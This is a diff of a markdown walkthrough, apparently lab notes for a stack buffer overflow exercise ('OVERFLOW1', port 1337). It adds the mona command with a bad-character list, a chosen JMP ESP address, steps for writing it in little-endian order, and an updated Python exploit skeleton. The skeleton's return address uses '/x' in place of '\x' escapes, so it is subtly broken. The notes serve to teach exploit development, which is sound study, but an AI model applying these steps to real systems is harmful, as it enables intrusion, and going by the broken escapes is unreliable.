@@ -413,21 +413,37 @@ payload = "\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\
 
     - **Making sure to update the `-cpb` option with all the `badchars` you identified (including `\x00`)**:
 
-        - `!mona jmp -r esp -cpb "\x00"`
+        - `!mona jmp -r esp -cpb "\x00\x07\x08\x2E\x2F\xA0\xA1"`
 
     - This command finds all `JMP ESP` (or equivalent) instructions with addresses that don't contain any of the badchars specified. 
     
+    - ![image](https://user-images.githubusercontent.com/94720207/169679944-7f2be7f5-8fc0-47c4-935e-71da215f3c2b.png)
+     
     - The results should display in the `Log data` window (use the Window menu to switch to it if needed).
 
     - Choose an address and update your python script with the new `overflow1_step4_findJumpPoint.py` script.
     
-        - Set the `retn` variable to the `address`, written `"special backwards"` (since the system is `little endian`). 
+        - 1st Pointer: `625011AF` 
+    
+        - Set the `retn` variable to the address, written `"special backwards"` (since the system is `little endian`). 
         
             - **For example:**
             
                 - If the address is `\x01\x02\x03\x04` 
                 
                 - in Immunity, write it as `\x04\x03\x02\x01` in your exploit.
+            
+            - **Reversing `little indian`:**
+            
+                - Normal: `625011AF`
+                
+                - Separate Normal: `62 50 11 AF`
+                
+                - Reversed pair: `AF 11 50 62`
+                
+                - Final Result: `/xAF/x11/x50/x62` 
+            
+            - **`retn` = `/xAF/x11/x50/x62`**     
 
 ```python
 import socket
@@ -438,9 +454,9 @@ port = 1337
 prefix = "OVERFLOW1 "
 offset = 0
 overflow = "A" * offset
-retn = "BBBB"
+retn = "/xAF/x11/x50/x62"
 padding = ""
-payload = "necesito poner algo aqui weyyyyyyyyyyyyy"
+payload = ""
 postfix = ""
 
 buffer = prefix + overflow + retn + padding + payload + postfix
